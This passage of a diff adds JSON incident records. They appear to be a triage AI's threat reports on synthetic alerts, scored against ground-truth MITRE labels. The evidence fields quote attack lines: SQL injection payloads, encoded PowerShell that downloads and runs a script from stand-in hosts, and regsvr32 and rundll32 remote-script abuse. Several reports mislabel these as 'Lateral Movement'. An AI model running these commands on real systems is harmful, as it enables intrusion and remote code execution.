+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.94"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Password spraying across accounts on src_ip:198.51.100.94. Detections: Password spraying across accounts. MITRE ATT&CK techniques tagged by detector: T1110.003."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_9d2b76a17e51",
+      "entity": "host:web-app-13",
+      "rule_ids": [
+        "NET-C2-PORT-001"
+      ],
+      "ground_truth_mitre": [
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_9d2b76a17e51",
+        "severity_assessment": "MEDIUM",
+        "threat_summary": "A connection to a known C2-associated port (5555) was detected on the web-app-13 host, indicating potential command and control activity.",
+        "threat_type": "Command and Control (C2) activity",
+        "recommended_action": "Investigate the web-app-13 host for signs of compromise and review network traffic for similar activity.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a connection to a known C2-associated port on a host is a strong indicator of potential command and control activity, as identified by the MITRE ATT&CK technique T1571.",
+        "processed_at": "2026-08-07T19:19:24.639549",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.38"
+          ],
+          "hosts": [
+            "web-app-13"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "5555"
+          ],
+          "text": "[MEDIUM] Connection to known C2-associated port on host:web-app-13. Detections: Connection to known C2-associated port. MITRE ATT&CK techniques tagged by detector: T1571."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_a014d6f7a7eb",
+      "entity": "src_ip:198.51.100.61",
+      "rule_ids": [
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_a014d6f7a7eb",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A potential SQL injection attack has been detected on a web request from IP address 198.51.100.61, targeting a vulnerable web application.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the source IP address 198.51.100.61 and block it temporarily to prevent further potential attacks. Review the web application for SQL injection vulnerabilities.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a SQL injection pattern in a web request is a strong indicator of a potential web application attack. The presence of the MITRE ATT&CK technique T1190 further supports this assessment.",
+        "processed_at": "2026-08-07T19:19:30.157219",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.61"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:198.51.100.61. Detections: SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1190. [iot-cam-06] POST /search.php body=q=' UNION SELECT username,password FROM users--"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_308871fdab0c",
+      "entity": "src_ip:203.0.113.127",
+      "rule_ids": [
+        "AUTH-SPRAY-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110.003"
+      ],
+      "report": {
+        "alert_id": "inc_308871fdab0c",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity password spraying attack has been detected originating from IP address 203.0.113.127, targeting multiple accounts.",
+        "threat_type": "Password Spray Attack",
+        "recommended_action": "Block the source IP address 203.0.113.127 and investigate the affected accounts for potential unauthorized access.",
+        "confidence_score": 0.95,
+        "reasoning": "The detection of password spraying across accounts, coupled with the presence of MITRE ATT&CK technique T1110.003, strongly indicates a password spray attack. The high severity rating further supports this assessment.",
+        "processed_at": "2026-08-07T19:19:35.610793",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.127"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Password spraying across accounts on src_ip:203.0.113.127. Detections: Password spraying across accounts. MITRE ATT&CK techniques tagged by detector: T1110.003."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_bc5eb9f17cc3",
+      "entity": "src_ip:198.51.100.23",
+      "rule_ids": [
+        "AUTH-BRUTE-001",
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110",
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_bc5eb9f17cc3",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity SQL injection pattern has been detected in a web request originating from IP address 198.51.100.23, indicating a potential attempt to exploit a vulnerability in a web application.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the source IP address 198.51.100.23 and review web application logs for any signs of unauthorized access or data exfiltration.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a SQL injection pattern in a web request is a strong indicator of a potential web application attack. The presence of MITRE ATT&CK techniques T1110 (Brute-force) and T1190 (Exploit Public-Facing Application) further supports this assessment.",
+        "processed_at": "2026-08-07T19:19:41.194963",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.23"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:198.51.100.23. Detections: Brute-force logon attempts, SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1110, T1190. [iot-cam-09] POST /account.php body=id=1'; EXEC xp_cmdshell('whoami')--"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_e3d4e04140b2",
+      "entity": "host:fin-ops-07",
+      "rule_ids": [
+        "PROC-ENC-PS-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1059.001"
+      ],
+      "report": {
+        "alert_id": "inc_e3d4e04140b2",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical alert has been triggered on host fin-ops-07 due to the detection of an encoded PowerShell command, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host fin-ops-07 for signs of compromise and isolate it from the network to prevent further potential damage.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of an encoded PowerShell command, along with the detection of MITRE ATT&CK techniques T1027 and T1059.001, suggests a potential attempt to move laterally within the network, which warrants a critical severity assessment.",
+        "processed_at": "2026-08-07T19:19:47.817816",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "fin-ops-07"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[CRITICAL] Encoded PowerShell command on host:fin-ops-07. Detections: Encoded PowerShell command. MITRE ATT&CK techniques tagged by detector: T1027, T1059.001. [fin-ops-07] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADEAMgA1AC8AeAAuAHAAcwAxACcAKQA="
+        }
+      }
+    },
+    {
+      "incident_id": "inc_8fc78afaae21",
+      "entity": "src_ip:203.0.113.27",
+      "rule_ids": [
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_8fc78afaae21",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A potential SQL injection attack has been detected on a web application, with a malicious payload attempting to extract user credentials.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the source IP 203.0.113.27 and review web application logs for further evidence of the attack.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a SQL injection pattern in a web request, coupled with the presence of a malicious payload attempting to extract user credentials, indicates a high likelihood of a web application attack.",
+        "processed_at": "2026-08-07T19:19:53.340738",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.27"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:203.0.113.27. Detections: SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1190. [web-app-08] POST /search.php body=q=' UNION SELECT username,password FROM users--"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_ed381e064d60",
+      "entity": "src_ip:203.0.113.196",
+      "rule_ids": [
+        "AUTH-BRUTE-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110"
+      ],
+      "report": {
+        "alert_id": "inc_ed381e064d60",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered due to brute-force logon attempts originating from IP address 203.0.113.196. This indicates a potential unauthorized access attempt.",
+        "threat_type": "Unauthorized Access",
+        "recommended_action": "Investigate the source IP address 203.0.113.196 and block it to prevent further attempts. Review login logs for any successful logins.",
+        "confidence_score": 0.9,
+        "reasoning": "The alert is triggered by a known MITRE ATT&CK technique (T1110) and has a high severity rating, indicating a strong likelihood of a malicious activity.",
+        "processed_at": "2026-08-07T19:19:58.856208",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.196"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Brute-force logon attempts on src_ip:203.0.113.196. Detections: Brute-force logon attempts. MITRE ATT&CK techniques tagged by detector: T1110."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_558665d0b469",
+      "entity": "host:fin-ops-10",
+      "rule_ids": [
+        "PROC-ENC-PS-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1059.001"
+      ],
+      "report": {
+        "alert_id": "inc_558665d0b469",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical alert has been triggered on host fin-ops-10 due to the detection of an encoded PowerShell command. This suggests a potential attempt to execute malicious code on the system.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host fin-ops-10 for signs of malicious activity and isolate it from the network to prevent further potential damage.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of an encoded PowerShell command, along with the detection of MITRE ATT&CK techniques T1027 and T1059.001, indicates a high likelihood of a malicious activity. The unknown source IP and protocol further support the critical severity of this alert.",
+        "processed_at": "2026-08-07T19:20:05.320725",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "fin-ops-10"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[CRITICAL] Encoded PowerShell command on host:fin-ops-10. Detections: Encoded PowerShell command. MITRE ATT&CK techniques tagged by detector: T1027, T1059.001. [fin-ops-10] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADgANAAvAHgALgBwAHMAMQAnACkA"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_f6b73dfe2929",
+      "entity": "host:backup-srv-06",
+      "rule_ids": [
+        "NET-C2-PORT-001"
+      ],
+      "ground_truth_mitre": [
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_f6b73dfe2929",
+        "severity_assessment": "MEDIUM",
+        "threat_summary": "A connection to a known C2-associated port (4444) was detected on the host backup-srv-06, indicating potential command and control activity.",
+        "threat_type": "Command and Control (C2) activity",
+        "recommended_action": "Investigate the host backup-srv-06 for signs of malware or unauthorized access, and review network traffic for similar connections.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a connection to a known C2-associated port, coupled with the presence of MITRE ATT&CK technique T1571, suggests a potential threat. However, the unknown protocol and lack of payload snippet reduce the confidence score.",
+        "processed_at": "2026-08-07T19:20:10.802243",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.132"
+          ],
+          "hosts": [
+            "backup-srv-06"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "4444"
+          ],
+          "text": "[MEDIUM] Connection to known C2-associated port on host:backup-srv-06. Detections: Connection to known C2-associated port. MITRE ATT&CK techniques tagged by detector: T1571."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_9d0bcb3e2a7f",
+      "entity": "host:ws-dev-08",
+      "rule_ids": [
+        "NET-C2-PORT-001"
+      ],
+      "ground_truth_mitre": [
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_9d0bcb3e2a7f",
+        "severity_assessment": "MEDIUM",
+        "threat_summary": "A potential command and control (C2) communication has been detected on host ws-dev-08, with a connection to a known C2-associated port 5555.",
+        "threat_type": "Command and Control (C2) activity",
+        "recommended_action": "Investigate the host ws-dev-08 for potential malware or unauthorized access, and review network traffic for similar suspicious connections.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a connection to a known C2-associated port, combined with the presence of MITRE ATT&CK technique T1571, suggests a potential C2 communication. However, the unknown protocol and lack of payload snippet reduce the confidence score.",
+        "processed_at": "2026-08-07T19:20:16.319691",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.104"
+          ],
+          "hosts": [
+            "ws-dev-08"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "5555"
+          ],
+          "text": "[MEDIUM] Connection to known C2-associated port on host:ws-dev-08. Detections: Connection to known C2-associated port. MITRE ATT&CK techniques tagged by detector: T1571."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_b3e2f3aa07c3",
+      "entity": "src_ip:198.51.100.77",
+      "rule_ids": [
+        "AUTH-SPRAY-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110.003"
+      ],
+      "report": {
+        "alert_id": "inc_b3e2f3aa07c3",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity password spraying attack has been detected from IP address 198.51.100.77, targeting multiple accounts.",
+        "threat_type": "Password Spray Attack",
+        "recommended_action": "Block the source IP address 198.51.100.77 and investigate the affected accounts for potential password compromise.",
+        "confidence_score": 0.95,
+        "reasoning": "The detection of password spraying across accounts, coupled with the presence of MITRE ATT&CK technique T1110.003, indicates a targeted attack. The high severity rating and lack of additional context suggest a high confidence in the threat assessment.",
+        "processed_at": "2026-08-07T19:20:21.837260",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.77"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Password spraying across accounts on src_ip:198.51.100.77. Detections: Password spraying across accounts. MITRE ATT&CK techniques tagged by detector: T1110.003."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_57b7bd3b92be",
+      "entity": "host:ws-dev-10",
+      "rule_ids": [
+        "NET-C2-PORT-001"
+      ],
+      "ground_truth_mitre": [
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_57b7bd3b92be",
+        "severity_assessment": "MEDIUM",
+        "threat_summary": "A connection to a known C2-associated port (6666) was detected on the host ws-dev-10, indicating potential command and control activity.",
+        "threat_type": "Command and Control (C2) activity",
+        "recommended_action": "Investigate the host ws-dev-10 for signs of malware or unauthorized access and review network traffic for similar connections.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a connection to a known C2-associated port, coupled with the presence of MITRE ATT&CK technique T1571, suggests a potential threat. However, the unknown protocol and lack of payload snippet reduce the confidence score.",
+        "processed_at": "2026-08-07T19:20:27.355633",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.60"
+          ],
+          "hosts": [
+            "ws-dev-10"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "6666"
+          ],
+          "text": "[MEDIUM] Connection to known C2-associated port on host:ws-dev-10. Detections: Connection to known C2-associated port. MITRE ATT&CK techniques tagged by detector: T1571."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_561dca997642",
+      "entity": "host:iot-cam-08",
+      "rule_ids": [
+        "NET-EXFIL-001"
+      ],
+      "ground_truth_mitre": [
+        "T1048"
+      ],
+      "report": {
+        "alert_id": "inc_561dca997642",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A large outbound transfer to an external host was detected on the IoT camera device 'iot-cam-08', indicating potential data exfiltration.",
+        "threat_type": "Data Exfiltration",
+        "recommended_action": "Investigate the IoT camera device 'iot-cam-08' for potential malware or unauthorized access, and review network traffic for similar activity.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a large outbound transfer to an external host on a device with no user interaction suggests a potential data exfiltration attack. The use of MITRE ATT&CK technique T1048 further supports this assessment.",
+        "processed_at": "2026-08-07T19:20:32.875588",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.209"
+          ],
+          "hosts": [
+            "iot-cam-08"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "443"
+          ],
+          "text": "[HIGH] Large outbound transfer to external host on host:iot-cam-08. Detections: Large outbound transfer to external host. MITRE ATT&CK techniques tagged by detector: T1048."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_889b71793f2e",
+      "entity": "src_ip:203.0.113.124",
+      "rule_ids": [
+        "AUTH-BRUTE-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110"
+      ],
+      "report": {
+        "alert_id": "inc_889b71793f2e",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered due to brute-force logon attempts originating from IP address 203.0.113.124. This activity may indicate an unauthorized access attempt.",
+        "threat_type": "Unauthorized Access",
+        "recommended_action": "Block the source IP address 203.0.113.124 and investigate further to identify the potential threat actor.",
+        "confidence_score": 0.85,
+        "reasoning": "The alert is triggered by a known MITRE ATT&CK technique (T1110) and has a high severity rating, indicating a potential security threat. However, the lack of additional information such as the destination IP, protocol, and payload snippet reduces the confidence score slightly.",
+        "processed_at": "2026-08-07T19:20:37.355980",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.124"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Brute-force logon attempts on src_ip:203.0.113.124. Detections: Brute-force logon attempts. MITRE ATT&CK techniques tagged by detector: T1110."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_bdf0f42d39e4",
+      "entity": "src_ip:198.51.100.225",
+      "rule_ids": [
+        "AUTH-BRUTE-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110"
+      ],
+      "report": {
+        "alert_id": "inc_bdf0f42d39e4",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered due to brute-force logon attempts originating from the IP address 198.51.100.225. This activity may indicate an unauthorized access attempt.",
+        "threat_type": "Unauthorized Access",
+        "recommended_action": "Investigate the source IP address 198.51.100.225 and block it to prevent further attempts. Review login logs for potential compromised credentials.",
+        "confidence_score": 0.85,
+        "reasoning": "The alert is triggered by a known detection rule for brute-force logon attempts, which is a common technique used by attackers (MITRE ATT&CK technique T1110). The high severity and lack of other indicators suggest a potential threat.",
+        "processed_at": "2026-08-07T19:20:43.010713",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.225"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Brute-force logon attempts on src_ip:198.51.100.225. Detections: Brute-force logon attempts. MITRE ATT&CK techniques tagged by detector: T1110."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_7d0dd29c6e7a",
+      "entity": "src_ip:198.51.100.232",
+      "rule_ids": [
+        "AUTH-SPRAY-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110.003"
+      ],
+      "report": {
+        "alert_id": "inc_7d0dd29c6e7a",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity password spraying attack has been detected originating from IP address 198.51.100.232, targeting multiple accounts.",
+        "threat_type": "Password Spraying",
+        "recommended_action": "Block the source IP address 198.51.100.232 and investigate the affected accounts for potential password resets.",
+        "confidence_score": 0.9,
+        "reasoning": "The detection of password spraying across accounts, coupled with the presence of MITRE ATT&CK technique T1110.003, indicates a targeted attack. The high severity rating and lack of additional context suggest a high confidence in the threat assessment.",
+        "processed_at": "2026-08-07T19:20:48.533003",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.232"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Password spraying across accounts on src_ip:198.51.100.232. Detections: Password spraying across accounts. MITRE ATT&CK techniques tagged by detector: T1110.003."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_ae5de7fb2a76",
+      "entity": "host:vpn-gw-03",
+      "rule_ids": [
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218"
+      ],
+      "report": {
+        "alert_id": "inc_ae5de7fb2a76",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on the VPN gateway host 'vpn-gw-03' due to Living-off-the-land binary abuse, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the VPN gateway host 'vpn-gw-03' for signs of compromise and review system logs for any suspicious activity.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of Living-off-the-land binary abuse on the VPN gateway host, coupled with the execution of the regsvr32.exe binary with suspicious command-line arguments, suggests a potential threat. The use of T1218 technique further supports this assessment.",
+        "processed_at": "2026-08-07T19:20:54.014349",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "vpn-gw-03"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:vpn-gw-03. Detections: Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218. [vpn-gw-03] regsvr32.exe /s /n /u /i:http://192.0.2.96/x.sct scrobj.dll"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_e2d4a89f11f5",
+      "entity": "host:api-gw-04",
+      "rule_ids": [
+        "NET-C2-PORT-001",
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218",
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_e2d4a89f11f5",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on host api-gw-04 due to suspicious activity involving a living-off-the-land binary abuse and a connection to a known C2-associated port.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host api-gw-04 for signs of malware or unauthorized access and consider isolating it from the network.",
+        "confidence_score": 0.85,
+        "reasoning": "The alert indicates a connection to a known C2-associated port and living-off-the-land binary abuse, which are indicative of a potential lateral movement attack. The use of rundll32.exe with a malicious payload further supports this assessment.",
+        "processed_at": "2026-08-07T19:21:00.875202",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.59"
+          ],
+          "hosts": [
+            "api-gw-04"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "4444"
+          ],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:api-gw-04. Detections: Connection to known C2-associated port, Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218, T1571. [api-gw-04] rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"new ActiveXObject('WScript.Shell')\")"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_bbd29296cb1d",
+      "entity": "src_ip:198.51.100.195",
+      "rule_ids": [
+        "AUTH-SPRAY-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110.003"
+      ],
+      "report": {
+        "alert_id": "inc_bbd29296cb1d",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity password spraying attack has been detected originating from IP address 198.51.100.195, targeting multiple accounts.",
+        "threat_type": "Password Spraying",
+        "recommended_action": "Block the source IP address 198.51.100.195 and investigate the affected accounts for potential password compromise.",
+        "confidence_score": 0.95,
+        "reasoning": "The detection of password spraying across accounts, coupled with the tagging of MITRE ATT&CK technique T1110.003, indicates a targeted and malicious attack. The high severity rating and lack of additional context suggest a high confidence in the threat assessment.",
+        "processed_at": "2026-08-07T19:21:05.331294",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.195"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Password spraying across accounts on src_ip:198.51.100.195. Detections: Password spraying across accounts. MITRE ATT&CK techniques tagged by detector: T1110.003."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_bc2a767da2a2",
+      "entity": "host:db-prod-01",
+      "rule_ids": [
+        "NET-C2-PORT-001",
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218",
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_bc2a767da2a2",
